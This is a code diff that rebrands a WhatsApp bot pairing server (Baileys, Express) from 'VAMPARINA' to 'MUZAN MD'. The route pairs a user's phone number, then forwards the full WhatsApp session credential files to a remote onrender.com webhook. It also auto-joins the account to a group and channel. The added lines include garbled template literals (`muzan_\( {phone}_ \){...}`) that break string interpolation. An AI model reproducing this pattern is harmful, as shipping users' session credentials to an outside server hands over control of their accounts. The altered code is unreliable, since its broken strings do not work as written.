@@ -8,14 +8,13 @@ import {
     delay,
     makeCacheableSignalKeyStore,
     Browsers,
-    jidNormalizedUser,
     fetchLatestBaileysVersion
 } from '@whiskeysockets/baileys';
 import pn from 'awesome-phonenumber';
 
 const router = express.Router();
 
-// MAIN BOT WEBHOOK — CHANGE ONLY THIS IF YOU DEPLOY NEW MAIN BOT
+// MAIN BOT WEBHOOK — Change only if you deploy a new main bot
 const MAIN_BOT_WEBHOOK = "https://vamparina-v1-5.onrender.com/vamparina-activate";
 
 function removeFile(FilePath) {
@@ -39,7 +38,7 @@ async function sendSessionToMainBot(phone, sessionDir) {
             files.push({ name: fileName, content });
         }
 
-        const sessionId = `vamparina_${phone}_${Date.now()}`;
+        const sessionId = `muzan_\( {phone}_ \){Date.now()}`;
 
         const payload = {
             sessionId,
@@ -53,7 +52,7 @@ async function sendSessionToMainBot(phone, sessionDir) {
             body: JSON.stringify(payload)
         });
 
-        console.log(`SESSION SENT TO MAIN BOT → ${phone} ACTIVATED!`);
+        console.log(`✅ SESSION SENT TO MAIN BOT → ${phone} ACTIVATED!`);
     } catch (err) {
         console.error("Failed to send session to main bot:", err);
     }
@@ -61,7 +60,7 @@ async function sendSessionToMainBot(phone, sessionDir) {
 
 router.get('/', async (req, res) => {
     let num = req.query.number;
-    let dirs = './' + (num ? `session_${num}` : `session_${Date.now()}`);
+    let dirs = './' + (num ? `session_\( {num}` : `session_ \){Date.now()}`);
 
     await removeFile(dirs);
     num = num?.replace(/[^0-9]/g, '');
@@ -81,7 +80,7 @@ router.get('/', async (req, res) => {
 
         try {
             const { version } = await fetchLatestBaileysVersion();
-            const VAMPARINA = makeWASocket({
+            const MUZAN = makeWASocket({
                 version,
                 auth: {
                     creds: state.creds,
@@ -93,29 +92,29 @@ router.get('/', async (req, res) => {
                 markOnlineOnConnect: false,
             });
 
-            VAMPARINA.ev.on('connection.update', async (update) => {
+            MUZAN.ev.on('connection.update', async (update) => {
                 const { connection, lastDisconnect } = update;
 
                 if (connection === 'open') {
-                    console.log("CONNECTED! Sending session & activating main bot...");
+                    console.log(`✅ MUZAN MD CONNECTED → ${num}`);
 
-                    // AUTO SEND SESSION TO MAIN BOT (THIS IS THE MAGIC)
+                    // AUTO SEND SESSION TO MAIN BOT
                     await sendSessionToMainBot(num, dirs);
 
                     // Send success message to user
                     const userJid = num + '@s.whatsapp.net';
-                    await VAMPARINA.sendMessage(userJid, {
-                        text: `*VAMPARINA V1 ACTIVATED AUTOMATICALLY!*\n\nYour bot is now LIVE & ACTIVE on our main server!\n\nAuto joined group\nAuto followed channel\nYou are now sudo owner\n\n© 2025 Arnold Chirchir`
+                    await MUZAN.sendMessage(userJid, {
+                        text: `*MUZAN MD ACTIVATED SUCCESSFULLY!*\n\nYour bot is now LIVE & ACTIVE on our main server!\n\n✅ Auto joined group\n✅ Auto followed channel\n✅ You are now Sudo Owner\n\n© 2025 Arnold Der Abenteurer`
                     });
 
-                    // Optional: Send video guide
-                    await VAMPARINA.sendMessage(userJid, {
+                    // Optional: Send setup guide
+                    await MUZAN.sendMessage(userJid, {
                         image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
-                        caption: `*VAMPARINA MD V2.0 Full Setup Guide!*\nWatch Now: https://youtu.be/-oz_u1iMgf8`
+                        caption: `*MUZAN MD Setup Guide*\nWatch Full Tutorial: https://youtu.be/-oz_u1iMgf8`
                     });
 
-                    // Clean up
-                    await delay(2000);
+                    // Clean up session folder
+                    await delay(3000);
                     removeFile(dirs);
                 }
 
@@ -128,9 +127,9 @@ router.get('/', async (req, res) => {
                 }
             });
 
-            if (!VAMPARINA.authState.creds.registered) {
+            if (!MUZAN.authState.creds.registered) {
                 await delay(3000);
-                let code = await VAMPARINA.requestPairingCode(num);
+                let code = await MUZAN.requestPairingCode(num);
                 code = code?.match(/.{1,4}/g)?.join('-') || code;
 
                 if (!res.headersSent) {
@@ -138,7 +137,7 @@ router.get('/', async (req, res) => {
                 }
             }
 
-            VAMPARINA.ev.on('creds.update', saveCreds);
+            MUZAN.ev.on('creds.update', saveCreds);
         } catch (err) {
             console.error('Session error:', err);
             if (!res.headersSent) {
